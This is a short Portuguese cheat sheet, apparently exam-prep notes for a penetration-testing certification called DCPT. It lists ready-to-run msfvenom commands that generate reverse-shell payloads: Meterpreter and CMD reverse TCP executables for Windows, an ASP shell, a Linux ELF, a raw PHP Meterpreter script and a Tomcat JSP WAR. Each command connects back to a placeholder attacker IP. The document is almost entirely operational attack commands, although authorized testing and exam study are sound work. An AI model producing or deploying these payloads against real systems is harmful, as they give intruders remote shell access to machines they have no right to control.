# ⚡ Gerando Payloads com msfvenom

> [!important] Regras da DCPT
> O uso de exploits automáticos do Metasploit Framework é proibido, porém o **uso do `msfvenom` para geração de payloads e executáveis É PERMITIDO**.

---

## 💻 Payloads para Windows

```bash
# Executável de 64-bit (Meterpreter Reverse TCP)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe -o shell.exe

# Executável de 32-bit (CMD Reverse TCP)
msfvenom -p windows/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe -o shell_32.exe

# Arquivo ASP (IIS Legacy)
msfvenom -p windows/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f asp -o shell.asp
```

---

## 🐧 Payloads para Linux

```bash
# Binário ELF 86/64
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f elf -o shell.elf
```

---

## 🌐 Payloads Web (PHP & JSP)

```bash
# Script PHP Raw
msfvenom -p php/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f raw > shell.php

# Arquivo WAR (Tomcat / Java Web Application)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f war -o shell.war
```